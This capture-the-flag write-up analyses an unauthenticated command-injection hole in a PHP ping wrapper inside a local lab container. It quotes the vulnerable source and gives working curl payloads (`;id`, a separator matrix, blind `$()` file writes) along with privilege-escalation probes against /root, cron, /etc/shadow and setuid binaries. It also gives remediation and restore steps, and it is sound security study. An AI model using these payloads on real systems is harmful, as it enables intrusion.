# 168 PingCTF — writeup

**The honest question first, because the answer shapes everything below.** Command
execution is a class this corpus already covers, and this lab is not a harder instance
of it. It is the class's **null-filter baseline**: CWE-78 reached by
`shell_exec()` with a raw `$_GET` concatenation and **no filter of any kind**. The
sink mechanism is the corpus's floor, not a new one — 189 (`index.php:27`), 218
(`index.php:8-45`), 296 and 271 all reach a shell first. What the lab adds is
narrow and real:

1. **The "is there a filter, and what kind" question gets a third answer** — *none* —
   and it is settled by **counts on the artefact**, not by absence of a 403. Labs 218
   and 84 fought over *string match vs scoring engine*; this lab is the instance that
   makes "neither" a measurable answer.
2. **A new instrument trap, quoted below:** the lab ships **no `ping` binary**, so the
   advertised functionality never works and the first payload shape a tester reaches
   for (`&&`) **short-circuits on the app's own missing dependency**. 8 of 9 separators
   fire; `&&` does not, and the reason is not the target refusing anything.
3. **A cross-read that resolves `self-corrections.md` §15 in the corpus's favour**:
   the same `htmlspecialchars()` is applied here, on the **output** side, and `&`
   works (measured). The §15 trap is side-of-the-boundary specific, not a property of
   the function.

The catalogue description — *"Explotación de una vulnerabilidad que permite la
ejecución de comandos en la máquina vulnerable"* — is **accurate and complete** for
this lab. Unlike lab 282, it does not understate a chain, and unlike lab 102 there is
no hidden entry path: the app is unauthenticated, and that is the whole entry.

**The escalation does not close, and it is not an inference.** Every leg was measured
with a work count, from the `uid=33` identity, in the instance the lab gave us.

---

## Surface

```
$ nmap -sV -Pn -p- 172.17.0.6
Nmap scan report for 172.17.0.6
Host is up (0.000046s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

Second instrument, because `nmap -p-` is TCP by definition
(`method/retrieval-hazards.md`):

```
$ awk 'NR>1 && $4=="0A"{print $2}' /proc/net/tcp /proc/net/tcp6 | sort -u | wc -l
1
$ cat /proc/net/udp /proc/net/udp6 | awk 'NR>1' | wc -l
0
```

**1 TCP listener, confirmed by two instruments. 0 UDP sockets, counted as lines beyond
the header — not as "absent".**

`auto_deploy.sh` read, not run (`auto_deploy.sh:131-134`): **one** container, `docker
run -d --name $CONTAINER_NAME $IMAGE_NAME`, no networks, no `macvlan --internal`, no
second host. A lab that silently wants more than it ships costs more than a failing
deploy; this one wants exactly what it gave.

**Versions read from the artefact, never recalled:**

| What | Value | Source |
|---|---|---|
| OS | `Ubuntu 24.04.2 LTS` | `/etc/os-release` `PRETTY_NAME` |
| Apache | `Apache/2.4.58 (Ubuntu)` | `apache2 -v`; `Server:` header on every response |
| PHP | `8.3.6` | `php -v` |
| Base image | `org.opencontainers.image.version` = `24.04` | `docker image inspect` |
| `ExposedPorts` | `80/tcp` | `docker image inspect` |
| `Cmd` | `apache2ctl -D FOREGROUND` | `docker image inspect` |

`disable_functions => no value => no value`, `open_basedir => no value => no value`
(`php -i`). **283 packages installed** (`dpkg -l | grep -c '^ii'`); **0** of
`sudo|iputils|cron|openssh` (`dpkg -l | grep -cE '^ii  (sudo|iputils|cron|openssh)'`).
That last count is load-bearing and is why two findings below read the way they do.

**The manifest's label was right.** `tooling/labs.manifest:74` reads
`168|PingCTF|facil|command execution; a covered class, kept as a generalisation test`.
The artefact is a ping wrapper, the class is command execution, and `fácil` is the
right rating for a one-hop unauthenticated sink with no filter. The label is not the
finding here — but the **lab** carries a defect, below.

Hidden surfaces: none found, and the search that proves it is the filter search in
[The class](#the-class), which needed positive controls because "no filter" is
exactly the shape of a tool that looked nowhere.

---

## The class

**Entry criterion (the question that started it):** *does the request value reach a
shell, and is anything between the parameter and the shell?* Read off the artefact
before the first request — the docroot is two files, 2 469 bytes total.

```
$ ls -la /var/www/html/
total 16
drwxr-xr-x 1 www-data www-data 4096 Jun 28  2025 .
drwxr-xr-x 1 root     root     4096 Jun 28  2025 ..
-rwxr-xr-x 1 www-data www-data 1536 Jun 28  2025 index.html
-rwxr-xr-x 1 www-data www-data  933 Jun 28  2025 ping.php
```

**Source that settled it — `ping.php`, all 28 lines, and there is no other code:**

`ping.php:3-4` — the value arrives raw:
```php
if (isset($_GET['target'])) {
    $target = $_GET['target'];
```

`ping.php:13` — concatenation into a command string, no quoting, no escaping:
```php
$command = "ping -c 4 " . $target; // Volvemos a -c 4 para que sea más claro
```

`ping.php:16` — the sink:
```php
$output = shell_exec($command);
```

`ping.php:19` and `ping.php:10` — the only sanitisation in the file, and it is on the
**output**:
```php
echo "<h1>Resultados para: " . htmlspecialchars($target) . "</h1>";   // :10
...
echo htmlspecialchars($output);                                        // :19
```

### Which kind of filter is this? **There is none.** — and that is a measurement

The brief's first named defect is a filter that reads a string while the shell reads a
pattern, and its remedy is to establish the filter's kind before theorising about it.
So: establish it. Five axes, each with a **positive control** in the same shell,
because a count of zero from a broken instrument is untested, not negative
(`self-corrections.md` §11, §12, §14).

```
=== filter surface, with positive controls ===
mods_enabled_count=32
mods_matching_security=0
mods_matching_uniqueid=0
htaccess_count=0
posctl_find_known=1            <- control: find CAN find a file I know exists (/var/www/html/ping.php)
posctl_htaccess_dir=0
disable_functions=[]
apcu=[]
grep -rn 'SecRule\|mod_security' /etc/apache2/ | wc -l
0
```

| Axis | Result | Positive control that makes the zero mean something |
|---|---|---|
| `mod_security` loaded? | **0 of 32** enabled mods match `security` | `ls /etc/apache2/mods-enabled/ \| wc -l` = **32** — the listing works |
| `mod_unique_id` loaded? | **0** match | same 32-module listing |
| `.htaccess` anywhere? | **0** on the whole `-xdev` fs | `find` returned **1** for the known `ping.php` in the same invocation |
| `SecRule` / `mod_security` in config? | **0** lines under `/etc/apache2/` | the same `grep` returns **1** for `shell_exec` in `ping.php` |
| `disable_functions` | **empty** | `php -r 'echo ini_get("disable_functions");'` returned `[]` — the getter works |
| PHP-level sanitiser of the input | **none** — the only two calls are on output (`ping.php:10`, `ping.php:19`) | 28-line file, read in full |

**Therefore lab 218's bypass has no analogue here, and lab 84's refutation does not
apply either.** There is no rule to quote because there is no rule. `[d]`-against-a-
blocklist and "a scoring engine has nothing unlisted to reach for" are both questions
about a filter, and this artefact answers *the filter is absent*.

**This is the lab's actual contribution to the class.** The corpus's command-execution
labs each had to reason about *which kind* of filter they faced, and reasoning about a
filter you have not established is how a bypass gets theorised and then reported. The
generalisable instrument is the one used above: **count the filter surface, and put a
positive control inside the same shell so the zero is evidence.**

---

## Chain

| # | → | Mechanism | Identity proof (quoted) |
|---|---|---|---|
| 0 | network | unauthenticated `GET /ping.php?target=`, no session, no auth, no nonce | **0** `Set-Cookie` headers in **10** consecutive requests (measured); handler is `if (isset($_GET['target']))` at `ping.php:3` and the 28-line file contains no `session_` call |
| 1 | `www-data` | CWE-78: raw `$_GET` concatenated into `shell_exec()` — `ping.php:4`, `:13`, `:16` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` and `Uid:	33	33	33	33` / `Gid:	33	33	33	33` / `CapEff:	0000000000000000` |
| — | ~~root~~ | **not reached** | see [Escalation](#escalation--measured-in-the-instance-not-reached) |

**One hop. No setuid transition** — all four `Uid` fields are `33`, which is the pair
that does not lie; `id -u` alone would have been the weaker measurement.

The sink fires, and the minimum proof is four characters of payload:

```
$ curl -s -w '%{size_download}' "http://172.17.0.6/ping.php?target=127.0.0.1%3Bid"
416
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

### The control/treatment pair, because a `200` that renders a page proves nothing

The brief's second defect is output-based oracles. Both legs below are the same
request shape, one byte-count apart, and the **control is the shipped behaviour**:

```
=== CONTROL (benign) ===
status=200 bytes=359
pre= ''
=== TREATMENT (minimal PoC) ===
status=200 bytes=416
pre= 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'
```

359 B with an empty `<pre>` vs 416 B carrying `uid=`. The 57-byte delta and the
identity in the body are the result; the 200 is not.

### A manufactured oracle, because one vector here is blind

Nine separators were tried. **Eight are observable in-band; one is blind**, and the
blind one is exactly the case where a `200` would have been filed as a result.

`$()` used as an argument produces **no** body output — the substitution's result
becomes `ping`'s *argument*, and `ping` does not exist, so the response is `200` with
an empty `<pre>` and a 505-byte body. Under lab 84's rule that proves nothing at all.
So the oracle was built before believing it:

```
$ curl -s -w '%{http_code} %{size_download}' --get \
    --data-urlencode "target=127.0.0.1 \$(printf 'DL168-BLIND-1790794365-c91e uid=%s euid=%s\n' \"\$(id -u)\" \"\$(id -un)\" > /var/www/html/.blind_168; true)" \
    "http://172.17.0.6/ping.php"
http_bytes=505        <- in-band pre = ''   : the 200 that proves nothing
$ curl -s -D- "http://172.17.0.6/.blind_168"
HTTP/1.1 200 OK
Content-Length: 49
DL168-BLIND-1790794365-c91e uid=33 euid=www-data
```

The witness is **distinguishable by design**: a fresh token
(`DL168-BLIND-1790794365-c91e`) and a path only the web identity can create
(`/var/www/html/` is `www-data:www-data 0755`; the file landed `-rw------- www-data
www-data`). The blind vector is proven, and `uid=33 euid=www-data` is the *pair* —
no setuid transition, which a bare `uid=33` would not have shown.

An in-band file oracle was also run, and observed **out of band** rather than trusted
because it appeared in the response:

```
-rw------- 1 www-data www-data 29 /var/www/html/.oracle_168     (ls -l, via the sink)
DL168-1790794316-a7f3 uid=33                                     (md5 bd1a51196463777a5a656c73a539e20a)
$ curl -s -D- http://172.17.0.6/.oracle_168  ->  200, Content-Length: 29, same marker
```

Both oracle files were deleted and the restore is verified below.

### Payload-shape matrix — and the one that fails for the lab's own reason

`?target=127.0.0.1 <sep> id -u;echo SEP_<x>`, one request each, `<pre>` extracted:

| Separator | `<pre>` | Verdict |
|---|---|---|
| `;` | `'33\nSEP_SEMI\n'` | fires |
| `\|\|` | `'33\nSEP_OR\n'` | fires |
| `\|` | `'33\nSEP_PIPE\n'` | fires |
| `` ` `` backtick | `'33\nSEP_BTICK\n'` | fires |
| literal `\n` | `'33\nSEP_NEWLINE\n'` | fires |
| `&` | `'33\nSEP_AMP\n'` | fires — see §15 below |
| `i""d` (quote split) | `'33\nSEP_QUOTESPLIT\n'` | fires |
| `$( )` | `''` | **executes but blind** — proven only by the file oracle above |
| **`&&`** | `'SEP_AND\n'` | **does not fire** |

`&&` fails because `ping` is not installed, so the **first** command in the chain exits
`127` and the operator short-circuits. This is finding F2 below, and it is the trap
this lab actually contains.

---

## Findings

### F1 — CWE-78 / CWE-77, unauthenticated OS command injection as `www-data`

**Evidence, verbatim, from the artefact:**

| `file:line` | Line |
|---|---|
| `ping.php:3` | `if (isset($_GET['target'])) {` |
| `ping.php:4` | `    $target = $_GET['target'];` |
| `ping.php:10` | `    echo "<h1>Resultados para: " . htmlspecialchars($target) . "</h1>";` |
| `ping.php:13` | `    $command = "ping -c 4 " . $target; // Volvemos a -c 4 para que sea más claro` |
| `ping.php:16` | `    $output = shell_exec($command);` |
| `ping.php:19` | `    echo htmlspecialchars($output);` |

`ping.php:4` assigns the parameter with **no** transformation. `ping.php:13` builds the
command by concatenation, so the attacker controls a *second* command word. `ping.php:16`
hands it to `shell_exec()`.

**Proof of reach, on the target:** `?target=127.0.0.1;id` → `200`, 416 B,
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`; blind `$()` proven by the
manufactured oracle in [The class](#a-manufactured-oracle-because-one-vector-here-is-blind).

**Impact.** Unauthenticated remote command execution as `www-data` on Ubuntu 24.04.2,
Apache 2.4.58, PHP 8.3.6. Full read/write as that identity: the docroot is
`www-data:www-data 0755`, so the attacker can drop and then fetch a file
(demonstrated, `200`/`Content-Length: 29`), and 8 directories on the filesystem are
writable by it. The 8 are enumerated as the identity, not guessed:
`/var/tmp`, `/var/lib/php/sessions`, `/var/cache/apache2/mod_cache_disk`,
`/var/www/html`, `/run/lock`, `/run/lock/apache2`, `/run/apache2/socks`, `/tmp`.
`disable_functions` is empty and `open_basedir` is unset, so no function allowlist
narrows it.

**Root cause.** Absence of input validation at `ping.php:4` and absence of
parameterisation or escaping at `ping.php:13`. `htmlspecialchars` at `:10` and `:19` is
an **HTML output encoder** applied to the response; it is silent about the shell, which
is the general rule from `self-corrections.md` §15 — *a sanitiser defends the grammar
it was written for and is silent about every other grammar reading the same bytes.*

**Remediation.** Do not build a shell string. If `ping` is genuinely required, exec it
without a shell (`proc_open` with an argument array, or a native PHP binding) and
validate the target against a host/IP grammar. At minimum, `escapeshellarg($target)`
at `:13`. Remove `htmlspecialchars` as a defence and keep it only as encoding.

### F2 — lab defect: the advertised functionality does not exist, and the app is silent about it

This is the most *transferable* thing in the lab, and it is not a security finding.

**`ping` is not installed.** Measured, with the control that makes the zero mean
something:

```
command -v ping; echo ping_rc=$?     ->  ping_rc=127          (no output before rc)
ls /bin/ping /usr/bin/ping /usr/sbin/ping 2>&1 | wc -l  ->  3   (three "No such file" lines: ls works)
dpkg -l | grep -cE 'iputils|inetutils'  ->  0
```

The app's own error is in Apache's log, **30 occurrences**:

```
$ grep -c ping /var/log/apache2/error.log
30
sh: 1: ping: not found
```

**Why this matters for a tester, and why it is filed separately from F1:**

- **The shipped `200` is the sink's own failure, not a block.** The response is
  `200`, 359 bytes, `<pre></pre>` — a page. Under lab 84's finding, *a body that looks
  like an error may be the sink's own error page*; here the body is empty **because
  the command failed**, and the log says so. Anyone reading only the HTTP response
  would be reading the absence of `ping`, not the presence or absence of a filter.
- **`shell_exec()` captures stdout only.** The `sh: 1: ping: not found` line is on
  **stderr** and is therefore invisible to the response. A multi-line probe that
  produced no output at all was this, not a filter: I had to add `exec 2>&1` to the
  payload before any escalation test produced evidence. **A silent body here is
  undetermined, not negative.**
- **`&&` is unusable as a payload shape**, because the first command exits `127` and
  the operator short-circuits. A tester whose first payload is `&& id` reads
  "injection failed" and stops. It has not failed; the app's own missing dependency
  ate the operator.
- **`||` and `|` still work**, because they do not depend on the first command's exit
  status — `|id -u` gives `33` with an empty stdin, and `||` fires because `ping`
  exits non-zero. So the operator that "works" and the operator that "doesn't" are
  orthogonal to the vulnerability, and that is a confusing surface to hand a student.

**Root cause.** The image omits the package the application shells out to, and the
handler neither checks the return status nor surfaces stderr.

**Remediation.** Install the dependency, or fail loudly; check the return code;
`2>&1` into the captured output so a failure is visible to the operator.

### F3 — CWE-209 / lab hygiene: `/var/www/html` is writable by the identity that serves it, and the error log is readable

Not required for the chain, and filed because it is what makes F1 persist: after
F1 lands, the attacker can write files that Apache will then serve, and
`Last-Modified`/`ETag` confirm they are real documents. Demonstrated with the oracle
files and removed afterwards. This is a **consequence of F1**, not an independent entry,
and the writeup does not claim it as a separate path.

### F4 — NOT a finding, recorded because it looks like one: no `FLAG{}` or equivalent

See [Reward](#reward). The description's "*permite la ejecución de comandos*" is
**complete** here — unlike lab 282, it does not understate a chain into an OS account
credential, and unlike lab 220 there is no unreachable reward. The description is not
the defect here. **The lab's defect is F2.**

---

## Escalation — measured in the instance, not reached

**Every row below was run from the `uid=33` identity, inside the deployed container, in
the sink itself.** `docker exec` runs as root, so a `test -w` or a `find -writable` run
that way would have measured root and deleted or invented a finding
(`self-corrections.md` §2). All of it went through the sink, as `www-data`.

```
--- writable dirs as www-data ---            (8, listed in F1)
--- escalation attempts, stderr merged ---
sh: 4: cannot create /root/.DL168_ESC: Permission denied      rc_root_write=2
drwx------ 2 root root 4096 May 29  2025 /root
sh: 6: cannot create /etc/cron.d/.DL168_ESC: Permission denied rc_cron_write=2
rc_sudo_which=127          (sudo is not installed; 0 matching packages)
passwd_writable_rc=1
su_writable_rc=1
shadow_writable_rc=1
CapEff:	0000000000000000
NoNewPrivs:	0
Seccomp:	2
/bin/sh /usr/sbin/apache2ctl -D FOREGROUND      (PID 1, and the only process)
```

| Vector | Result | Work count / proof |
|---|---|---|
| Write `/root/` | `Permission denied`, `rc=2` | 1 attempt, stderr merged; `/root` is `drwx------ root root` |
| Write `/etc/cron.d/` | `Permission denied`, `rc=2` | 1 attempt — the one writable-adjacent directory that a root job would read |
| `sudo` | `rc=127`, absent | 0 of 283 installed packages match `sudo`; `command -v sudo` → 127 |
| Write `/etc/passwd`, `/usr/bin/su`, `/etc/shadow` | all `rc=1` not writable | 3 predicates, all from the `uid=33` identity |
| `su` → `ubuntu` | `su: Authentication failure` | **the instrument demonstrably ran** — it printed `Password:` and then the failure, so this is not a silent tool (§11) |
| `ubuntu`'s password | `ubuntu:!:20237:0:99999:7:::` — field 2 is `!` | **1** account with uid ≥ 1000, **0** with a hash. `su` cannot succeed against a `!` field |
| `/home/ubuntu` | `ls: cannot open directory ... Permission denied`, `read_bashrc_rc=1` | `drwxr-x--- ubuntu:ubuntu` |
| setuid / setgid binaries | 13 files, **all stock Ubuntu** | enumerated: `chage expiry passwd chsh gpasswd newgrp chfn mount umount su vim.basic unix_chkpwd pam_extrausers_chkpwd`. No undeclared grant — contrast lab 189, where the whole escalation was an undeclared `NOPASSWD: /usr/bin/wget` |
| cron daemon | `pgrep -a cron` → `rc=1`, not running | `/etc/cron.d/` holds `e2scrub_all` and `php`, both root-owned and unwritable |
| Capabilities | `CapEff: 0000000000000000` | read from the sink's own `/proc/self/status`; `getcap` is not installed, so the mode-based count is the one used, and both agree on nothing |
| Container escape surface | `/var/run/docker.sock` absent; `docker`/`nsenter`/`capsh` all `rc=127` | 3 binaries probed |
| userns | `/proc/self/uid_map` = `0 0 4294967295` | not remapped |
| netns | `/proc/self/ns/net` == `/proc/1/ns/net` | same namespace as PID 1 |

**Conclusion: this lab has exactly one hop, and the second hop does not exist.** Not
inferred from a mode, a name, or a config value — each of the eleven rows above is a
measurement with a count, and the `su` negative is backed by an instrument that was
observed to fire.

---

## Controls that held

There is **no** input control to test here, so this table is the interesting one: what
held is not a filter but the *privilege boundary below the sink*, and each row carries
the positive control that proves the detector works.

| Control | Held? | Positive control that proves this detector works |
|---|---|---|
| Command injection → root | **Yes** | `/var/www/html/.oracle_168` written by the sink as `www-data 0600` and re-read `200`/29 B — write primitive proven **green** before any negative about writing elsewhere is believed |
| `/root` write boundary | **Yes** | Same shell, same instant: the same `printf … > /var/www/html/…` succeeded (`rc=0`, file listed). Control and negative differ only in the path |
| `/etc/cron.d` write boundary | **Yes** | Same shell: `/var/www/html` write succeeded; `/etc/cron.d` returned `rc=2` |
| `sudo` | **Yes (absent)** | `command -v` — the same `command -v ping` returned `ping_rc=127` with the binary genuinely missing, proving the probe discriminates present vs absent |
| `su` | **Yes (locked)** | The `su` binary **ran**: it printed `Password:` before failing, so the failure is a real authentication rejection, not a tool that did nothing |
| `shadow` readability | **Yes** | `grep '^ubuntu:' /etc/shadow` as root returned the line with `rc=0`; as `www-data` the same `grep` in the sink produced no line |
| setuid inventory | **Yes (no undeclared grant)** | The 13 paths are real files, listed with modes; the count is a filesystem walk, not a name pattern |
| `CapEff` | **Yes (zero)** | `CapEff` was parsed from the sink's **own** `/proc/self/status` — a field that exists and prints, so a zero is a value, not an absent tool |
| Cron surface | **Yes (not running)** | `pgrep` returns 1 for absent processes and 0 for present ones — established by PID 1, which `pgrep` **does** find: `tr '\0' ' ' < /proc/1/cmdline` → `/bin/sh /usr/sbin/apache2ctl -D FOREGROUND` |
| Unauthenticated access to the sink | **No — absent by design** | **10** consecutive requests, **0** `Set-Cookie` headers emitted; and the whole docroot is 2 files, so "no auth" is also a completeness claim, not a sampling one |

---

## NOT tested vs discarded with reason

Two separate lists, per the runbook. **A count of zero is UNTESTED, not a negative.**

### NOT tested (a count of zero means untested)

| Path | Why untested |
|---|---|
| **Argument injection into `ping`** (CWE-88) — `?target=-f`, `?target=-p`, `?target=--help` | The `ping` binary does not exist (F2). **0** argument-injection payloads were meaningfully executed: the shell resolved the name and exited `127` before `ping` could parse anything. This is a real CWE-88 surface in the design and it is **unreachable on this image** |
| CWE-88 impact as a non-root user (`-f` flood, `-I` source, `-p` pattern writing to stdout) | Same cause. `ping -h` via the sink returned `sh: 11: ping: not found`, `ping_rc=127` — zero information about `ping`'s own argument surface |
| Exfiltration over ICMP/DNS (the classic use of a ping sink) | Same cause. Without `ping` there is no second channel; the only channel is the HTTP response body, which the in-band markers already use |
| Kernel-level surface of ICMP sockets (`SOCK_DGRAM` vs raw) | Untested: no `ping`, and no capability to create a raw socket (`CapEff=0`) |
| Time-based blind confirmation (response-time differential) | Not attempted. Not needed — the in-band oracle and the manufactured file oracle are both decisive, so a weaker instrument was not spent |
| Whether the container survives a flood of concurrent requests | Not attempted. No DoS testing was in scope for this engagement |

### Discarded with a reason

| Candidate | Discarded because |
|---|---|
| `setuid` binaries as an escalation | 13 enumerated, all stock Ubuntu, **no undeclared grant**. Lab 189's escalation was *exactly* an undeclared `sudoers` line; there is no `sudoers` file on this image at all (`/etc/sudoers`: `No such file or directory`, `/etc/sudoers.d/`: `No such file or directory`) |
| `e2scrub_all` / `php` cron scripts as a write target | Root-owned `0644` in a `0755` directory; the write was **attempted** and returned `rc=2`. And the cron daemon is not running (`pgrep` rc 1) |
| `su` → `ubuntu` → `/home/ubuntu` | `ubuntu:!:…` — the field is `!`, not a hash. **1** account checked, **0** with a password. And `/home/ubuntu` is `0750 ubuntu:ubuntu`, unreadable by `uid=33` |
| `/run/apache2/socks` (a writable dir in the list of 8) | Writable by `www-data`, but nothing in the image consumes it. Listed as writable-inert rather than claimed as a path |
| `/var/lib/php/sessions` (writable) | No application in the docroot uses sessions — 2 files, neither references `session_start`. Writing there has no reader |
| Docker-socket escape | Socket absent, 3 client binaries absent, userns not remapped. **Not a negative from a broken tool:** the `ls` returned `No such file or directory` rather than nothing |

---

## Instrumentation defects

The section worth reading, because two of these four **would have produced a shipped
result that was false.**

### D1 — My first escalation probe returned nothing, and I nearly filed it as a control

A multi-line payload ending in five escalation predicates produced an 1118-byte
response whose `<pre>` stopped after the banner. Read carelessly, that is "the target
refused all five".

Cause: **`shell_exec()` captures stdout only.** The `Permission denied` lines were on
**stderr**. The fix was to send `exec 2>&1` as the first line of the payload, after
which all five produced real output. This is the same family as
`self-corrections.md` §15 — *a body that reads like a block is not necessarily a
block* — and it is the single most dangerous property of this sink. **Any negative
taken from the response body of this app is undetermined until stderr is merged.**

### D2 — `&&` failed, and the app's own missing dependency was the cause

The first payload shapes I reached for are `&&` and `;`. `;` worked immediately.
`&& id -u` returned `SEP_AND` and nothing else. The natural reading — "`&&` is
filtered" — is **wrong**, and so is "the injection is flaky". `ping -c 4 127.0.0.1`
exits `127` because the binary is missing, so `&&` short-circuits before my command
runs. Diagnosed by the same instrument that proved `;` works, in one request:
`command -v ping; echo ping_rc=$?` → `ping_rc=127`.

**The generalisable trap: on a sink whose first command may fail, the operator
`&&` tests the *application's* success, not the injection.** Two of my nine matrix rows
are shaped by this and one of them is a false negative. A single fixed separator
(`;`) would have hidden it; the matrix is what exposed it.

### D3 — Two of my own artefacts polluted the reward search

The reward sweep found `grep -rIl 'FLAG{' /` → **1 file** and `'dl{'` → **3 files**.
The first was **my own probe script**, `/tmp/r.sh`, which I had `docker cp`'d into the
container and which contains the literal string `FLAG{` in its own grep pattern. The
other two are genuine false positives:

```
/usr/include/c++/13/chrono                 ->  dl{__wdl} / dl{__mdl}   (C++ source template macros)
/usr/lib/python3/dist-packages/pip/_vendor/pygments/formatters/latex.py  ->  dl{\char`\$}
```

After removing my scripts and re-running: **`FLAG{` in 0 of 15 132 files**,
`dl{` in 2 (both the false positives above). This is §14's lesson with a new costume:
**the searcher's own pattern is a match.** A reward search that reports hits in a
directory you wrote to is reporting you.

### D4 — A payload-shape extraction that silently returned empty, and I nearly read it as "does not fire"

My separator matrix used an inline `python3 -c` inside a shell loop, piped from
`curl -s`. It printed `pre=''` for **every** row — including the `;` row I had already
proven fires out-of-band. The `pre` values were wrong; the payloads were fine. I caught
it because the *byte counts* disagreed with the extraction (375 B with an empty `<pre>`
is not a self-consistent response), and re-ran the matrix writing each body to its own
file. The lesson is §17: in a two-stage pipeline, **count the work on each side
independently** — a byte count that contradicts the parsed field is the tell.

---

## Reward

**None. Measured absence, with the search.**

```
files_total=15132
grep_FLAG_files=0            (grep -rIl 'FLAG{' / --exclude-dir=proc --exclude-dir=sys)
grep_dlbrace_files=2         (both C++/LaTeX template false positives, quoted in D3)
grep_congrats=0              (grep -rIl 'Congratulations' /var/www /root /home /opt /srv)
name_flag_secret_reward=0    (find -iname, after excluding flags/buildflags/headers/libs)
html_files=9                 (2 in the docroot: index.html, ping.php — the rest are stock docs)
docroot_files=2
posctl_grep_known=1          (control: the same grep returns 1 for shell_exec in ping.php)
```

15 132 files searched; **0** contain `FLAG{`. The `find -iname` pass returned **at least
20** raw hits on the first run — the listing was truncated at 20 by `head`, so 20 is a
lower bound and not a total — and **0** after excluding `flags`, `buildflags`,
`page-flags`, `tty_flags`, `bitops`, `/usr/include`, `/usr/lib`, `/usr/share`. Every
one of the 20 shown was a C or Perl identifier, listed and read rather than dismissed.
The search was run **as root** in the instance, so it is not a search that lacked
permission.

**Nothing is invented here.** Per `corpus/INDEX.md`'s `FLAG{}` column, this lab is a
`—`, and the count above is what supports it.

---

## Restore

Recreated from the image, not by undoing edits, and verified with a **positive** check
that includes a byte count that had to return to its shipped value:

```
$ docker rm -f ping_ctf_container && docker run -d --name ping_ctf_container ping_ctf:latest
restore_index status=200 bytes=1536            <- index.html, shipped size
restore_ping  status=200 bytes=359             <- the shipped empty-<pre> baseline, identical to first run
$ docker exec ping_ctf_container ls -la /var/www/html/
-rwxr-xr-x 1 www-data www-data 1536 Jun 28  2025 index.html
-rwxr-xr-x 1 www-data www-data  933 Jun 28  2025 ping.php
```

**2 files, shipped sizes, shipped mtimes.** Both oracle files
(`/var/www/html/.oracle_168`, `/var/www/html/.blind_168`) and both scratch scripts
(`/tmp/r.sh`, `/tmp/r2.sh`) are gone. The 359-byte `/ping.php` response is the
strongest restore check available here: it is the *shipped* behaviour, so a restore
that left my markers in place would have changed it.

Left running, as the pipeline expects — "restore means the lab is back to shipped", not
"the container is deleted". Image `ping_ctf:latest` retained until the parent reclaims
it; no global prune was run, and nothing belonging to another principal was touched.

---

## Next step

**Feed forward: extend the existing row, add nothing new.**

Against `RUNBOOK.md` §5, the class row that names this lab's question is **WAF / filter
— "is the filter a string match or a scoring engine, and is the request body even
inspected?"** Labs 218 and 84 answer "string" and "scoring engine". This lab answers
**"neither — there is none, and here is the count that proves it"**, and that is a third
data point on a row that already exists, not a new heading.

Two things belong in `method/self-corrections.md` for the parent to weigh:

1. **The `&&` trap (D2).** On a sink whose leading command can fail, `&&` measures the
   application's success, not the injection. Eight of nine separators fired; the ninth
   was shaped by the app's own missing dependency. Cheapest possible discriminator:
   `command -v <the thing you are chaining after>; echo rc=$?` in the same payload.
2. **The stdout-only property (D1).** `shell_exec()` returns stdout. Every negative
   taken from the response body of such a sink is **undetermined** until `exec 2>&1`
   is prepended. This is the generalisation of lab 84's "a body that looks like an
   error may be the sink's own error page": here the body was *empty*, for the same
   reason.

Neither is a new class. Both are the same root as §11–§17 — *a tool that found nothing
and a tool that has not looked print the same thing* — in a costume the catalogue has
not worn yet.

**Sibling cross-reads, per rule 8:**

- **189** — same class, and its real escalation was an **undeclared** `sudoers` grant.
  This lab has no `sudoers` file at all and 13 stock setuid binaries, so the two
  writeups are complementary, not contradictory: 189 shows what a chain looks like when
  the lab plants the grant; this one shows that CWE-78 with **no** grant on top is a
  one-hop finding whose severity is bounded by the container's own defaults.
- **218 / 84** — both had a filter and the interesting question was which kind. Neither
  contradicts this lab; this lab is the point at which the filter count is zero. The
  §15 `&`-escaping finding from 189 is **confirmed not to apply here**, and the reason
  is structural rather than coincidental. 189 applies the encoder to the **input** —
  `189/ROLAROLA-WRITEUP.md:187`, `5:     $nombre = htmlspecialchars($_POST["nombre"]);`
  — so `&` becomes `&amp;` before the shell ever sees it, and its working payload is
  `$( )` for exactly that reason (`189/ROLAROLA-WRITEUP.md:481`: *"`htmlspecialchars`
  does not touch `$( )`"*). Here the encoder is applied only to the **output**
  (`ping.php:19`) and never to the request, so `&` reaches `/bin/sh` intact: measured
  **403 B** for the `&` payload against the **392 B** `;` baseline, both carrying `33`.
  Same function, **different side of the boundary** — which is the point of §15 and is
  now a two-lab measurement rather than a one-lab sample.
- **115** — the model for how to close an engagement without an escalation. Lab 115
  reached no RCE and filed its escalation as an inference under NOT tested. **This lab
  reached RCE and closed its escalation as a measurement**, which is the stronger of the
  two positions, and the eleven-row table is why.
